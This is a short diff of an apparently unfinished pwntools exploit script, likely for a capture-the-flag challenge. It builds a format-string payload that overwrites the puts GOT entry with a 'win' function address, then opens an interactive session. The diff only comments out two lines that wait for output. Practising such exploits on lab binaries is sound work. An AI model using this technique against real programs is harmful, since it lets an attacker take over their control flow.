@@ -8,8 +8,8 @@ binary.address = main - binary.sym.main
 offset = 10
 payload = fmtstr_payload(offset,{binary.got.puts:binary.sym.win})
 p.sendline(payload)
-null = payload.find(b'\x00')
-p.recvuntil(payload[null-3:null])
+#null = payload.find(b'\x00')
+#p.recvuntil(payload[null-3:null])
 
 p.interactive()
 #NOT FINISHED
